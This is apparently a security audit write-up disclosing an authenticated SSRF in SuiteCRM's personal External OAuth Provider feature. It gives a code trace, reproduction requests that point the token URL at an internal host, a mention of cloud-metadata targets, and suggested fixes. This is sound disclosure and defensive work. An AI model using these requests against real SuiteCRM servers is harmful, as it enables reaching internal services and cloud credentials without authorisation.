# VULN-085 — Authenticated SSRF via user-settable token URL on a personal `ExternalOAuthProvider`

**ID**: VULN-085
**Software**: SuiteCRM — https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (`suitecrm_version.php`), commit `62effd0ceb767ed3b634ade585b19a6633eb4fcb`
**Severity**: Medium — **CVSS 3.1 6.5** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N`
**Status**: CONFIRMED (dynamic)
**Auth required**: Any authenticated user — create-access to a *personal* OAuth provider is granted to every user with no ACL/admin gate; a freshly-created, non-admin regular user is used throughout.
**What an attacker gains**: a self-service SSRF primitive with a semi-blind read channel — the attacker drives both ends of a fake OAuth flow to make the server POST to any internal `host:port` it chooses, and the (fabricated) response comes back rendered into their own authenticated page.

## 1. Summary

SuiteCRM's "External OAuth Provider" feature lets any user configure a *personal* provider — their own set of OAuth endpoints for connecting an external calendar/mail account. The token endpoint (`url_access_token`) is a bean field the creating user fully controls, and it is never checked against SuiteCRM's own `validate_external_host()` SSRF allow-list. Because the user also controls when the "callback" fires (they can complete their own authorize step and hit the callback endpoint directly), they can force the server to perform an authenticated OAuth token-exchange POST against any internal address, on demand.

## 2. How it works (mechanism & code trace)

**Create-access with no gate** — `modules/ExternalOAuthProvider/controller.php:62-64`:
```php
if (empty($_REQUEST['record']) && $_REQUEST['type'] === 'personal') {
    $this->hasAccess = true;
    return;
}
```
Any authenticated user creating a *new* record with `type=personal` is granted access outright. This is reinforced by the bean's own ACL override, `ExternalOAuthProvider::ACLAccess()` (`ExternalOAuthProvider.php:170-198`), which returns `true` for any view/save on a personal-type record the caller's `hasAccessToPersonalAccount()` approves (`:115-141` — true whenever `created_by` is empty or equals `current_user->id`, i.e. your own records). Verified live: a throwaway non-admin user's `POST module=ExternalOAuthProvider&action=Save&type=personal...` returned `301` to the new record's DetailView, and the DB row's `created_by` matched that user's own id exactly.

**The user-controlled field** — `modules/ExternalOAuthProvider/ExternalOAuthProvider.php:353-358` (`getConfigArray()`):
```php
'extra_provider_params' => array_merge(
    ['scopes' => $this->getScope(),
     'urlAuthorize' => $this->url_authorize ?? '',
     'urlAccessToken' => $this->url_access_token ?? '',   // :357 -- straight from the bean field
    ],
    $this->getExtraProviderParams()
),
```
`url_access_token` is a plain `varchar` field (`vardefs.php:213-224`), populated straight from `$_POST['url_access_token']` by the framework's generic mass-assignment in `pre_save()` (`include/MVC/Controller/SugarController.php:657`, `$this->bean->$field = $_POST[$field];` for every field present in `field_defs`) — there is no server-side default, no allow-list, and the field's `display: readonly` UI hint (meant only to make the EditView show it via a special widget) has no effect on what a raw POST can set.

**The sink** — `modules/ExternalOAuthConnection/entrypoint/setExternalOAuthToken.php:62-72`:
```php
if (empty($_GET['state']) || ($_GET['state'] !== $_SESSION['oauth2state'])) {
    $oAuth->cleanSession();
    exit('Invalid state');
}
$code = $_GET['code'] ?? '';
...
$token = $oAuth->getAccessToken($providerId, $code);   // :72
```
`getAccessToken()` drives `league/oauth2-client`'s `AbstractProvider::getAccessToken()`, which performs a real Guzzle HTTP POST to `getBaseAccessTokenUrl()` — i.e. `url_access_token` — with no `validate_external_host()` anywhere in the chain.

**Why the `state` check doesn't stop this**: it defends against *cross-site* forgery (someone else driving your session into an attacker flow). It does not stop the attacker from driving *their own* session through the flow they set up themselves: they load `entryPoint=redirectToExternalOAuth` (this legitimately populates `$_SESSION['oauth2state']` and returns it in the redirect URL — the attacker doesn't need to guess it, it is handed to them), then call the callback with that exact value.

## 3. Why it is a vulnerability (reasoning)

The trust boundary here is the same one `validate_external_host()` exists to protect everywhere else in this codebase: the application server must not make outbound requests to addresses an external, non-admin actor names, without checking those addresses aren't internal. The "personal OAuth provider" feature was clearly built with *some* least-privilege awareness — it deliberately lets ordinary users self-serve their own calendar/mail integrations without needing an admin to pre-register every possible provider. But that design choice only makes sense if the endpoints such a user can supply are constrained the same way any other user-supplied URL is elsewhere in the app. They are not: the exact same `validate_external_host()` function that guards the RSS dashlet and (partially) the CalendarAccount sync path is simply never invoked here. There is no legitimate reason a *personal* provider (as opposed to an admin-configured *system* provider) should be allowed to target `169.254.169.254` or a container-internal database port.

## 4. Reproduction

From a clean state:

1. **Preconditions**: `automation.py` creates a throwaway non-admin user and logs in once, reusing that single session for every subsequent step; starts an HTTP listener on `172.18.0.1:33119` that answers POSTs with a valid JSON token body.
2. **Create the malicious provider** (as the low-priv user; full request in `request.http`):
   ```
   POST /index.php
   module=ExternalOAuthProvider&action=Save&type=personal&connector=Generic
   &url_access_token=http://172.18.0.1:33119/token-<canary>
   &url_authorize=https://example.com/oauth/authorize
   &extra_provider_params-key[]=urlResourceOwnerDetails&extra_provider_params-value[]=https://example.com/resource
   ```
   → `301` to the new record's DetailView.
3. **Self-drive the OAuth flow**:
   ```
   GET /index.php?entryPoint=redirectToExternalOAuth&provider=<id>&clientId=&clientSecret=
   ```
   → `302` with `state=<value>` in the `Location`.
   ```
   GET /index.php?entryPoint=setExternalOAuthToken&provider=<id>&state=<value>&code=anycode
   ```
4. Run `NO_COLOR=1 ./run.sh 2>&1 | tee run.log`. Expected/observed: exit 0, `==> VULN-085: CONFIRMED`.
5. **Observable proof** — `evidence/oob_listener.log`:
   ```
   POST /token-oauth085_94163786
     User-Agent: GuzzleHttp/7
     BODY: client_id=poc-client&client_secret=poc-secret&redirect_uri=...&grant_type=authorization_code&code=anycode
   ```
   and `response.txt` shows the forged `poc-access-token` (the literal string our OOB listener's fake JSON response contained) rendered back into the page via `setToken.tpl`'s `BroadcastChannel` script — a full round trip from internal target to the attacker's browser context.

## 5. Impact

- **Confidentiality**: semi-blind SSRF — an internal endpoint's response is parsed as an OAuth token payload and specific fields (whatever the provider's token-field mapping extracts) are rendered back to the attacker; at minimum, reachability/timing/error-message signals are available for any target.
- **Cloud metadata / internal API reach**: `url_access_token` can point at `169.254.169.254` or any container/VM-internal service; a server that returns JSON with an `access_token`-shaped field will have that value reflected to the attacker.
- **Pre/post-auth**: post-auth, lowest privilege — no admin/ACL requirement, confirmed live with a bare regular-user account.
- **Chaining**: part of the SSRF cluster with [VULN-045](../VULN-045/writeup.md), [VULN-014](../VULN-014/writeup.md), [VULN-094](../VULN-094/writeup.md), [VULN-047](../../vulns/VULN-047.md); corrects/extends stage-01 [VULN-014](../../vulns/VULN-014.md)'s note that ExternalOAuth provider URLs are admin-fixed — true for *system* providers, false for *personal* ones.

## 6. Suggested fix

- Run both `url_access_token` and `url_authorize` through `validate_external_host()` in `ExternalOAuthProvider::save()` (`ExternalOAuthProvider.php:98-109`, where `hasAccessToPersonalAccount()` is already checked) before persisting, rejecting private/reserved targets at write time.
- Additionally validate at use-time in `ExternalOAuthProviderConnector::getAccessToken()`/`getProvider()`, pinning the resolved IP for the actual connection (no redirect-follow), consistent with the fix recommended for the other sinks in this cluster.
- Consider restricting personal providers to an admin-curated allow-list of endpoints/domains rather than fully free-form URLs, since the whole point of a "personal" record is to be configured without admin review.

## 7. References

- CWE-918: Server-Side Request Forgery — https://cwe.mitre.org/data/definitions/918.html
- OWASP SSRF Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy, "Server-side request forgery (SSRF)" — https://portswigger.net/web-security/ssrf
- Related known-issue cluster: CVE-2026-29107 / 69137 / 61649 (see [VULN-045](../VULN-045/writeup.md)/[VULN-094](../VULN-094/writeup.md)) — this finding is a distinct, newly-identified sink (personal `ExternalOAuthProvider`) in the same SSRF family, not previously attributed to a public CVE.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 70 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. GitHub Advisory Database query `suitecrm ssrf` — CVE-2023-6388 (7.14.2, Fluid Attacks), CVE-2023-6124 (huntr, fixed 7.14.2; fix commit 54bc56c3 touches `DashletGeneric*.php`, `AOS_PDF_Templates.php`, `Document.php`, `download.php` — not ExternalOAuth), CVE-2019-13335; none names `ExternalOAuthProvider`.
2. GitHub Advisory Database query `suitecrm oauth` — 0 advisories.
3. Fetched GHSA-72r3-24x4-j46c (CVE-2026-69137) — SSRF via `server_url` in `CalendarAccount&action=testConnection` → `CalDAVProvider::makeCalDAVRequest()`, fixed 7.15.2; different module and sink.
4. Fetched GHSA-r665-27q3-wvg8 (CVE-2026-61649) — `isSelfRequest()` substring bypass of `validate_external_host()`; a guard bypass, whereas this sink never calls the guard at all.
5. CVE-2026-29107 / GHSA-g7cv-4ghj-x98h — SSRF via `<img>` in PDF templates; different component.
6. Full SuiteCRM GHSA catalogue (77 advisories through 2026-10-12) — SSRF advisories cover Activity Stream (GHSA-2674-4gq4-j4f4), Connectors (GHSA-wg74-772c-8gr7 / CVE-2024-36414), RSS dashlet (GHSA-x3p2-qcqh-qx2m), PDF export, CalendarAccount, SchedulersJob cron (GHSA-gx3x-3f4c-cjmx) and `isSelfRequest()`; none concerns the personal `ExternalOAuthProvider` token/authorize URLs.
7. Upstream diffs: v7.14.4..v7.14.5 only sets `$this->bean->type='personal'` in `ExternalOAuthConnection/controller.php`; v7.15.1..v7.15.2 touches only `ExternalOAuthConnection` JS/TPL/editviewdefs; `modules/ExternalOAuthProvider/*` is unchanged and no host validation was added to the token exchange.
(Note: the shared WebSearch budget was exhausted before this folder; checks were made by direct fetch of the advisory databases, CVE.org records and the upstream repository.)

**Related but distinct public references** (same class or component, not this bug):
- CVE-2026-69137 / GHSA-72r3-24x4-j46c — authenticated SSRF in CalendarAccount `testConnection`; same "user-supplied integration URL" pattern, different module.
- CVE-2026-61649 / GHSA-r665-27q3-wvg8 and CVE-2026-29097 / GHSA-x3p2-qcqh-qx2m — `validate_external_host()` / RSS dashlet SSRF fixes; this finding is a sink that bypasses nothing because it is never guarded.
- CVE-2024-36414 / GHSA-wg74-772c-8gr7, CVE-2023-6124, CVE-2023-6388, CVE-2019-13335 — older SuiteCRM SSRFs in other components.

**Reasoning:** SuiteCRM has many published SSRF advisories, but each names a specific sink (Connectors, RSS, PDF, CalendarAccount, SchedulersJob, Activity Stream) and none is the self-created personal `ExternalOAuthProvider` whose `url_access_token` is POSTed to by the league OAuth2 client in `setExternalOAuthToken.php`. Confidence is moderate because SSRF is the most actively reported class in this project in 2026 (five advisories in six months), so a parallel private report on this module is plausible.
